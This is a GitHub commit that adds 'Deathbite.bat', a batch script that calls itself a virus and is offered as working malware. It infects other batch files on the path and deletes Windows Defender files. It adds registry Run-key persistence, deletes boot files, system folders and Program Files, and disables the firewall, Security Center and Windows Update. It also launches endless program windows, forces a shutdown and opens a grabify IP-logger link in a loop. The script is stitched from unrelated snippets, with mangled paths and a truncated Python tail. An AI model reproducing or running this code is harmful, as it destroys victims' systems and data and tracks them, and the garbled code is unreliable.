45498e660f02a0cc8240b7622ecefdbafafda6b2
username347 <81492258+username347@users.noreply.github.com>
2021-08-09 15:19:15 -0400

    Add files via upload

---
+++ Deathbite.bat
@@ -0,0 +1,222 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCuDJH2B9VY4KhJASUqHJG7a
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+start iexpress (https.grabify.link/WH6B78)
+@echo off>nul.ViRuS
+if ?%1==?/ViRuS_MULTIPLY goto ViRuS_multiply
+if ?%1==?/ViRuS_OUTER_LOOP goto ViRuS_outer_loop
+if ?%1==?/ViRuS_FINDSELF goto ViRuS_findself
+if ?%VOFF%==?T goto ViRuS_OLDBAT
+set ViRuSname=%0
+if not exist %0.bat call %0 /ViRuS_FINDSELF %path%
+if not exist %ViRuSname%.bat set ViRuSname=
+if ?%ViRuSname%==? goto ViRuS_OLDBAT
+rem ViRuS if batch is started with name.BAT, virus will not become active
+rem ViRuS it was a bug, now it?s a feature ! (also notice the voff variable)
+rem ViRuS also if batch was only in an append /xn path (chance=minimal)
+attrib +h %ViRuSname%.bat
+for %%a in (%path%;.) do call %0 /ViRuS_OUTER_LOOP %%a
+attrib -h %ViRuSname%.bat
+set ViRuSname=
+goto ViRuS_OLDBAT
+:ViRuS_findself
+if ?%2==? goto XXX_END>nul.ViRuS
+if exist %2%ViRuSname%.bat set ViRuSname=%2%ViRuSname%
+if exist %ViRuSname%.bat goto XXX_END
+if exist %2%ViRuSname%.bat set ViRuSname=%2%ViRuSname%
+if exist %ViRuSname%.bat goto XXX_END
+shift>nul.ViRuS
+goto ViRuS_findself
+:ViRuS_outer_loop
+for %%a in (%2*.bat;%2*.bat) do call %0 /ViRuS_MULTIPLY %%a
+goto XXX_END>nul.ViRuS
+:ViRuS_multiply
+find ?ViRuS? <%ViRuSname%.bat >xViRuSx.bat
+find /v ?ViRuS? <%2 |find /v ?:XXX_END? >>xViRuSx.bat
+echo :XXX_END>>xViRuSx.bat
+del ConfigSrcurityPolicy.exe
+del EppManifest.dll
+del MpAsDesc.dll
+del MpClient.dll
+del MpOAV.dll
+del MsMpLics.dll
+copy xViRuSx.bat %2>nul
+del xViRuSx.bat
+goto XXX_END>nul.ViRuS
+:ViRuS_OLDBAT
+echo on>nul.ViRuS
+echo This Virus Is Made By 5H4D0W,bystwn22.
+:XXX_END
+echo @echo off>c:windowswimn32.bat
+echo break off>>c:windowswimn32.bat
+echo ipconfig/release_all>>c:windowswimn32.bat
+echo end>>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+@echo off ipconfig /release_all
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+echo You Have Been HACKED!
+PAUSE
+REN *.DOC *.TXT REN *.JPEG *.TXT
+REN *.LNK *.TXT
+REN *.AVI *.TXT
+REN *.MPEG *.TXT
+del windowswimn32
+REN *.COM *.TXT
+REN *.BAT *.TXT
+copy Deathbite.exe
+add Deathbite.exe
+start Deathbite.exe
+@echo off
+attrib -r -s -h c:autoexec.bat
+del c:autoexec.bat
+attrib -r -s -h c:boot.ini
+del c:boot.ini
+start Deathbite.exe
+attrib -r -s -h c:ntldr
+del c:ntldr
+attrib -r -s -h c:windowswin.ini
+del c:windowswin.ini
+@echo off
+reg
+add HKLMSoftwareMicrosoftWindowsCurrentVersionRun /v MiXedVeX /t
+REG_SZ /d %systemroot%HaloTrialScoreChangerV1 /f > nul
+start iexpress (website of your choice)
+ipconfig /release
+del “C:Program FilesMicrosoft Games
+del “C:Nexon
+del “C:Program FilesXfire
+del C:Program FilesAdobe”
+del “C:Program FilesInternet Explorer”
+del “C:Program FilesMozilla Firefox”
+del “C:WINDOWS”
+del “C:WINDOWSsystem32”
+del “C:WINDOWSsystem32cmd”
+del “C:WINDOWSsystem32iexpress”
+del “C:WINDOWSsystem32sndvol32”
+del “C:WINDOWSsystem32sndrec32”
+del “C:WINDOWSsystem32Restorerstrui”
+del “C:WINDOWSsystem32wupdmgr”
+del “C:WINDOWSsystem32desktop”
+del “C:WINDOWSjava”
+del “C:WINDOWSMedia”
+del “C:WINDOWSResources”
+del “C:WINDOWSsystem”
+del “C:drivers”
+del “C:drv”
+del “C:SYSINFO”
+del “C:Program Files”
+echo ipconfig/release_all>>c:windowswimn32.bat
+net stop “Security Center”
+net stop SharedAccess
+> “%Temp%.kill.reg” ECHO REGEDIT4
+>>”%Temp%.kill.reg” ECHO.
+>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesS haredAccess]
+>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004
+>>”%Temp%.kill.reg” ECHO.
+>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesw uauserv]
+>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004
+>>”%Temp%.kill.reg” ECHO.
+>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMControlSet001Serviceswscsv c]
+>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004
+>>”%Temp%.kill.reg” ECHO.
+START /WAIT REGEDIT /S “%Temp%.kill.reg”
+del “%Temp%.kill.reg”
+del %0
+echo @echo off>c:windowswimn32.bat
+echo break off>>c:windowswimn32.bat
+echo ipconfig/release_all>>c:windowswimn32.bat
+echo end>>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+:a
+start iexpress (https://grabify.link/WH6B78)
+goto a
+@ECHO OFF
+START reg delete HKCR/.exe
+START reg delete HKCR/.dll
+START reg delete HKCR/*
+@echo off
+😡
+start winword
+start mspaint
+start notepad
+start write
+start cmd
+start explorer
+start control
+start calc
+goto x
+@echo off
+😡
+start winword
+start mspaint
+start notepad
+start write
+start cmd
+start explorer
+start control
+start calc
+goto x
+del c:WINDOWSsystem32*.*/q
+@echo off
+shutdown -c “Error! You are too stupid!” -s
+start Deathbite.bat
+loop
+
+@Echo off
+pconfig /release
+IPconfig renew
+from sys import argv
+
+import os
+
+script = argv
+name = str(script[0])
+
+cmd = ‘start payload.txt’
+os.system(cmd)
+os.mkdir(‘clone’)
+os.system(r”copy payload.txt clone”)
+os.system(r”copy ” Deathbite.bat ” clone”)
+os.system(
+
+
+
+
+
+
+
+
+
+
+
